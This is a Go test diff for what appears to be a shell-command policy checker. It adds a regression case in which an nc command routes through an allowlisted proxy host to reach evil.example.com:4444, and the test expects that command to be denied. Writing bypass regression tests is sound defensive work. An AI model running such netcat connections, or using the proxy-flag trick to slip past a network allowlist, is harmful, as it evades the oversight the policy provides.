@@ -81,6 +81,8 @@ func TestBypassRegressions(t *testing.T) {
 		{"grep_include_glob", BackendWorkspaceExec, "grep --include='*.pem' foo .", DecisionAllow, ""},
 		{"find_name_glob", BackendWorkspaceExec, "find . -name '*.pem'", DecisionAllow, ""},
 		{"nc_allowlisted_host", BackendWorkspaceExec, "nc github.com 443 payload.bin", DecisionAllow, ""},
+		// A proxy/source address flag must not hide the real target host.
+		{"nc_proxy_hidden_target", BackendWorkspaceExec, "nc -x proxy.github.com:1080 evil.example.com 4444", DecisionDeny, RuleNetNonWhitelist},
 	}
 	for _, c := range cases {
 		t.Run(c.name, func(t *testing.T) {
